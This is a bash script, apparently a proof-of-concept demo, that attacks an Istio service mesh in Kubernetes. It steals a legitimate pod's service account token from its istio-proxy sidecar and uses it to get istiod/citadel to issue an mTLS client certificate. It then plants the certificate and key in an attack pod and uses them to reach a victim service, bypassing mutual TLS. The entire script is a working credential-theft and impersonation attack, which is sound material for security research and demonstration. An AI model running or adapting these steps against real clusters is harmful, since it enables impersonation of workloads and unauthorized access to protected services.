#!/bin/bash

echo "deleting previously generated key and signing request"
rm -rf istio-attack.key istio-attack.csr

echo "deleting previously stolen client cert"
rm -rf istio-attack-stolen-client.crt

echo "generating a random key and signing request"
openssl req -new -newkey rsa:2048 -nodes -config csr.conf -keyout istio-attack.key -out istio-attack.csr

echo "'stealing' the service account token from the sidecar proxy of a legit client pod"
legit_pod=$(kubectl get po -n secure -l app=legitclient -ojsonpath='{..metadata.name}')
legit_token=$(kubectl exec -n secure -c istio-proxy ${legit_pod} -- cat /var/run/secrets/tokens/istio-token)

# craft our payload by escaping the newlines in our csr and fashioning some crude json
csr=$(cat istio-attack.csr)
escaped_csr=${csr//$'\n'/\\n}
payload="{\"csr\": \"${escaped_csr}\"}"

# extract some info from our stolen token
legit_svc_acct=$(echo "${legit_token}" | cut -d'.' -f2 | base64 -d | jq '."kubernetes.io".serviceaccount.name')
legit_ns=$(echo "${legit_token}" | cut -d'.' -f2 | base64 -d | jq '."kubernetes.io".namespace')

# port-forward to istiod so we can make the citadel RPC call
kubectl port-forward svc/istiod -n istio-system 15012:15012 &
# wait for port-forward to be established
sleep 3

echo "using service account ${legit_svc_acct} in namespace ${legit_ns} to ask istiod/citadel for a client certificate"
istiod_response=$(echo ${payload} | grpcurl -insecure -d @ -rpc-header "authorization: Bearer ${legit_token}" localhost:15012 istio.v1.auth.IstioCertificateService/CreateCertificate)

# this is probably not nice
pkill kubectl

# the response contains both our client cert and the root cert but we only need to
# extract the first one (client) to prove our point
stolen_client_cert=$(echo ${istiod_response} | jq '.certChain[0]' -r)
echo "${stolen_client_cert}" > istio-attack-stolen-client.crt

# extract the modulus from our stolen client cert and our private key
stolen_client_cert_mod=$(cat istio-attack-stolen-client.crt | openssl x509 -noout -modulus | openssl md5)
istio_attack_key_mod=$(cat istio-attack.key | openssl rsa -noout -modulus | openssl md5)

if [[ "${stolen_client_cert_mod}" == "${istio_attack_key_mod}" ]]; then
  echo "confirmed that the modulus of our private key matches the modulus of our stolen cert"
  echo "istiod has successfully issued us an mTLS client cert!" 
else
  echo "something went wrong stealing the client cert, exiting!"
  exit 1
fi

attack_pod=$(kubectl get po -n attack -l app=attack -ojsonpath='{..metadata.name}')

echo "copying private key and stolen client cert into attack pod"
kubectl cp istio-attack-stolen-client.crt attack/${attack_pod}:/
kubectl cp istio-attack.key attack/${attack_pod}:/

echo "attempting to connect to victim service from the attack pod without using stolen credentials"
echo "(we expect connection will fail: reset by peer)"
kubectl exec ${attack_pod} -n attack -- curl victim.secure.svc.cluster.local

victim_pod_ip=$(kubectl get po -n secure -l app=victim -ojsonpath='{..ip}')

echo "attempting to connect to victim pod ip addresess from the attack pod (bypassing auto mTLS) using stolen credentials"
echo "(we expect connection will succeed)"
kubectl exec ${attack_pod} -n attack -- curl -k --cert istio-attack-stolen-client.crt --key istio-attack.key https://${victim_pod_ip}:80/headers
